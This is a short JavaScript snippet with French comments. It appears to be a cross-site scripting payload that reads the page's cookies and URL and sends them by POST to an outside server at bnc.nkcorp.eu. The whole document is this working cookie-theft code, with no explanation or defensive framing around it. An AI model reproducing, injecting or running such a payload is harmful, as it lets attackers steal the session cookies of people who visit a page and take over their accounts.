(function() {
    var cookie = document.cookie;
    var xhr = new XMLHttpRequest();
    var yourServerURL = "https://bnc.nkcorp.eu/adm/";
    var pageUrl = document.location.href;

    // Préparez les données à envoyer
    var data = "cookie=" + encodeURIComponent(cookie) + "url=" + encodeURIComponent(pageUrl);

    // Configurez la requête
    xhr.open("POST", yourServerURL, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    // Envoyez la requête avec les données
    xhr.send(data);
})();
